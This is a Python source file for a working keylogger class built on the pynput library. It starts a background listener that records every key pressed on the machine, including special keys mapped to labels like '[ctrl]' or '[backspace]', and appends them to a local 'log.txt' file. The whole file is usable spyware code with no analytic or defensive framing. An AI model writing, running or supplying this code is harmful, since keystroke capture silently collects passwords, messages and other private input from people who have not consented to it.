from pynput import keyboard
import threading

class KeyLogger:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.listener = None
        self.is_running = False

        self.key_mappings = {
            'Key.space': " ",
            'Key.enter': "\n",
            'Key.shift': " [shift] ",
            'Key.shift_l': " [left shift] ",
            'Key.shift_r': " [right shift] ",
            'Key.ctrl': " [ctrl] ",
            'Key.ctrl_l': " [left ctrl] ",
            'Key.ctrl_r': " [right ctrl] ",
            'Key.alt': " [alt] ",
            'Key.alt_l': " [left alt] ",
            'Key.alt_r': " [right alt] ",
            'Key.alt_gr': " [alt gr] ",
            'Key.cmd': " [cmd] ",
            'Key.cmd_l': " [left cmd] ",
            'Key.cmd_r': " [right cmd] ",
            'Key.backspace': " [backspace] ",
            'Key.caps_lock': " [caps lock] ",
            'Key.delete': " [delete] ",
            'Key.down': " [down arrow] ",
            'Key.up': " [up arrow] ",
            'Key.left': " [left arrow] ",
            'Key.right': " [right arrow] ",
            'Key.end': " [end] ",
            'Key.esc': " [esc] ",
            'Key.f1': " [f1] ",
            'Key.home': " [home] ",
            'Key.insert': " [insert] ",
            'Key.menu': " [menu] ",
            'Key.num_lock': " [num lock] ",
            'Key.page_down': " [page down] ",
            'Key.page_up': " [page up] ",
            'Key.pause': " [pause/break] ",
            'Key.print_screen': " [print screen] ",
            'Key.scroll_lock': " [scroll lock] ",
            'Key.tab': " [tab] "
        }

    def _on_press(self, key):
        try:
            letter = str(key).replace("'", "")
            if letter in self.key_mappings:
                letter = self.key_mappings[letter]
            with open(self.log_file, "a") as f:
                f.write(letter)
        except Exception as e:
            with open(self.log_file, "a") as f:
                f.write(f"[{key}]")

    def start(self):
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_running = True

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
            self.is_running = False
